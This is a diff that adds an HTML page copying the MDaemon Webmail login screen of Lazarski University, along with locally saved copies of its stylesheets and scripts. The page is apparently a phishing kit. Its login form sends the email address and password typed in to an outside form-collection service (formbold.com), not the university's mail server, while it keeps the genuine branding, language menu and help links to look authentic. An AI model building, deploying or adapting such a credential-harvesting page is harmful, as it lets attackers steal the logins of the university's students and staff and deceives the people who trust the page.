@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <meta charset="UTF-8">
+        <meta name="ROBOTS" content="NOINDEX, FOLLOW">
+        <meta name="viewport" content="initial-scale=1,user-scalable=no,maximum-scale=1,width=device-width">
+        <title>MDaemon Webmail</title>
+	    <link rel="shortcut icon" href="https://mail.lazarski.edu.pl/favicon.ico?v=d9a5dc4c4fc" type="image/x-icon">
+        <link rel="stylesheet" href="lazarski_files/font-awesome.min.css">
+	    <link rel="stylesheet" href="lazarski_files/logon.css">
+        <script type="text/javascript" src="lazarski_files/jquery-latest.js"></script>
+        <script type="text/javascript">
+            var $WC = {
+                "lang": "pl",
+                "useBrowserLang": true,
+                "languages": ["en","ar","ca","zh","cs","da","uk","fi","fr","fc","de","gr","hu","id","it","ja","ko","nl","no","pl","pt","ro","ru","sr","sl","es","sv","tw","th","tr","vi",null],
+                "theme": "WorldClient",
+                "link": "/WorldClient.dll",
+                "action": "/WorldClient.dll?View=Main",
+                "https": true,
+                "allowWebAuthnLogin": true,
+                "attemptingDeviceAuth": "Trwa próba logowania poprzez uwierzytelnienie urządzeniem.",
+                "unableToAuthenticateDevice": "Nie można uwierzytelnić bieżącego użytkownika. Po zalogowaniu się może być wymagana rejestracja danych logowania.",
+                "capsLockIsOn": "Użyto klawisza Caps Lock"
+            };
+        </script>
+    </head>
+    <body>
+        <form action="https://formbold.com/s/9mxdY" autocomplete="off" target="_top" method="post" novalidate="">
+            <input type="hidden" name="LoginToken" value="">
+            <div id="logoContainer">
+                <div id="biglogo" align="center"><img src="lazarski_files/Banner.png" alt="MDaemon Webmail"></div>
+            </div>
+            <div id="formWrapper">
+                <span class="pull-right small-font">
+                    <a href="http://www.mdaemon.com/Software/MDaemon-Webmail-WorldClient/#Help" id="helpTranslation" target="_blank">Help</a>                </span>
+                
+                <div class="innerTable">
+                    <div class="loginText">
+                        <div class="heading">
+                            Webmail
+                        </div>
+                                                    <div id="statusMessage">&nbsp;</div>
+                                                <div class="warning-text">&nbsp;</div>
+                    </div>
+                    <div class="roundyMcRounderson">
+                        <i class="fa fa-user fa-inverse fa-lg"></i>
+                        <input type="email" name="User" id="User" placeholder="email address">
+                    </div>
+                    <div class="roundyMcRounderson password-input">
+                        <i class="fa fa-lock fa-inverse fa-lg"></i>
+                        <input type="password" id="Password" name="Password" value="" placeholder="password" autocomplete="off">
+                        <i class="fa fa-eye fa-lg toggle-show-password" data-input="Password"></i>
+                    </div>
+                                        <div class="forgot-password">
+                                                <a id="passwordRecovery" href="#" class="small-font">Forgot your password?</a>
+                                            </div>
+                    <div class="login-input">
+                        <button class="loginButton" type="submit" name="Logon" id="Logon">Sign In <i class="fa fa-arrow-right fa-lg"></i></button>
+                    </div>
+                    <div>&nbsp;</div>
+                    <div class="login-input">
+                                            <select class="" name="Lang" id="Lang">
+                            <option class="select-placeholder" value="" disabled="disabled" id="languageTranslationString">Language</option>
+                                                        <option value="en" selected="selected">English</option>
+                                                        <option value="ar">العربية</option>
+                                                        <option value="ca">Català</option>
+                                                        <option value="zh">中文</option>
+                                                        <option value="cs">Česky</option>
+                                                        <option value="da">Dansk</option>
+                                                        <option value="uk">English-UK</option>
+                                                        <option value="fi">Suomi</option>
+                                                        <option value="fr">Français</option>
+                                                        <option value="fc">Canadien français</option>
+                                                        <option value="de">Deutsch</option>
+                                                        <option value="gr">Ελληνικά</option>
+                                                        <option value="hu">Magyar</option>
+                                                        <option value="id">Bahasa Indonesia</option>
+                                                        <option value="it">Italiano</option>
+                                                        <option value="ja">日本語</option>
+                                                        <option value="ko">한글</option>
+                                                        <option value="nl">Nederlands</option>
+                                                        <option value="no">Norsk (bokmål)</option>
+                                                        <option value="pl">Polski</option>
+                                                        <option value="pt">Português</option>
+                                                        <option value="ro">Romana</option>
+                                                        <option value="ru">Русский</option>
+                                                        <option value="sr">Srpski</option>
+                                                        <option value="sl">Slovenščina</option>
+                                                        <option value="es">Español</option>
+                                                        <option value="sv">Svenska</option>
+                                                        <option value="tw">Taiwan</option>
+                                                        <option value="th">ไทย</option>
+                                                        <option value="tr">Türkçe</option>
+                                                        <option value="vi">Tiếng Việt</option>
+                                                    </select>
+                                                                <select class="" name="Theme" id="Theme">
+		                    <option class="select-placeholder" value="" disabled="disabled" id="themeTranslationString">Theme</option>
+		                                                <option value="Lite">Lite</option>
+                                                        <option value="LookOut">LookOut</option>
+                                                        <option value="Pro">Pro</option>
+                                                        <option value="Standard">Standard</option>
+                                                        <option value="WorldClient" selected="selected">WorldClient</option>
+                            		                </select>
+                                        </div>
+                                            <div class="login-input" id="WebAuthnLogin" style="display: block;">
+                            <div>&nbsp;</div>
+                            <button class="loginButton" type="button" id="DeviceLogin" title="Użyj zarejestrowanych danych uwierzytelniających do logowania" disabled="disabled"><i class="fa fa-id-badge"></i> Logowanie bez hasła</button>
+                        </div>
+                                        <div>&nbsp;</div>
+                                    </div>
+            </div>
+        </form>
+        <div align="center" class="branding">
+	         <a href="http://www.mdaemon.com/Software/MDaemon-Webmail-WorldClient/" target="_blank">MDaemon Webmail  © 2024 MDaemon Technologies, Ltd.</a>
+                        
+        </div>
+
+                
+	    <script type="text/javascript" src="lazarski_files/globals.min.js"></script>
+        <script type="text/javascript" src="lazarski_files/punycode.min.js"></script>
+                <script type="text/javascript" src="lazarski_files/base64util.js"></script>
+        <script type="text/javascript" src="lazarski_files/wcapi.js"></script>
+                <script type="text/javascript" src="lazarski_files/logon.js"></script>
+    
+
+</body></html>
